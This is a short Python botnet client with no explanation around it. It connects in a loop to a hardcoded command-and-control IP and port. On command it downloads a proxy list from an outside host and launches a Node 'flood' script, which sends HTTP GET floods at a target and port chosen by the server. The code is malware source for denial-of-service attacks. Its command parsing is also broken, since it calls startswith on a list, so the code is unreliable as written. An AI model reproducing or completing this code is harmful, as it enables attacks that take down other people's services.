import socket
import time
import os
import subprocess
SERVER_IP = "160.191.243.93"
PORT = 9000

while True:
    try:
        s = socket.socket()
        s.connect((SERVER_IP, PORT))

        while True:
            data = s.recv(4096)
            if not data:
                raise Exception
            cmd = data.decode(errors="ignore").split()
            
            print(cmd)
            if cmd.startswith("load"):
                subprocess.Popen(
                    ["wget", "https://popsiclenetwork.github.io/proxy/proxies.txt"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            if cmd.startswith("flood") :
                subprocess.Popen(
                    ["node", f"./script/flood.js" , "GET", cmd[1], cmd[2], "60", "10" , "proxies.txt"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )

    except:
        time.sleep(5)
